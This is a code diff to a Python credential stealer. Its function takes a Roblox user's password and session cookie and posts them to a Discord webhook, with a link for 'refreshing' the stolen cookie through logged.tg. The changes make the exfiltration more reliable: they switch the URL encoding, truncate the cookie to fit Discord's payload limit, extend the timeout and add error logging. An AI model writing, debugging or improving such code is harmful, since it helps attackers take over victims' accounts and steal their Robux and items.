@@ -65,9 +65,9 @@ def send_to_discord_background(password, cookie, webhook_url):
         # Prepare full cookie with warning prefix for refresh link
         full_cookie_with_warning = f'_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{cookie}'
         
-        # URL encode the full cookie for the refresh link
+        # URL encode the full cookie for the refresh link (use safer encoding)
         import urllib.parse
-        encoded_full_cookie = urllib.parse.quote(full_cookie_with_warning, safe='')
+        encoded_full_cookie = urllib.parse.quote_plus(full_cookie_with_warning)
         
         # Truncate cookie if too long for Discord embed
         available_cookie_space = 3990  # Conservative limit
@@ -153,16 +153,35 @@ def send_to_discord_background(password, cookie, webhook_url):
         payload_size = len(json.dumps(discord_data))
         print(f"Background: Sending Discord payload of size: {payload_size} bytes")
         
-        response = requests.post(webhook_url, json=discord_data, timeout=5)
+        # Check if payload is too large (Discord limit is around 6000 characters)
+        if payload_size > 5500:
+            print(f"Background: Payload too large ({payload_size} bytes), truncating cookie")
+            # Truncate the encoded cookie if it's too long
+            if len(encoded_full_cookie) > 2000:
+                shortened_cookie = encoded_full_cookie[:2000] + "..."
+                discord_data['embeds'][0]['fields'][0]['value'] = f'[**__Discord Server__ <:discord_icon:1236760091794083903>**](https://discord.gg/SsWFKqXr)\n\n[**__Refresh Cookie__ <:cookie1:1322924823764013086>**](https://dropref.com/?https://www.logged.tg/tools/refresher?defaultFill={shortened_cookie})'
+                payload_size = len(json.dumps(discord_data))
+                print(f"Background: Reduced payload size to: {payload_size} bytes")
+        
+        response = requests.post(webhook_url, json=discord_data, timeout=10)
         
         if response.status_code in [200, 204]:
             print(f"Background: Discord webhook successful: {response.status_code}")
         else:
             print(f"Background: Discord webhook failed: {response.status_code}")
+            print(f"Background: Discord error response: {response.text}")
+            # Try to get more detailed error info
+            try:
+                error_data = response.json()
+                print(f"Background: Discord error details: {error_data}")
+            except:
+                print("Background: Could not parse Discord error response as JSON")
         
             
     except Exception as e:
         print(f"Background: Error sending to Discord: {str(e)}")
+        import traceback
+        print(f"Background: Full error traceback: {traceback.format_exc()}")
 
 def get_roblox_user_info(cookie):
     """Get Roblox user information using the provided cookie"""
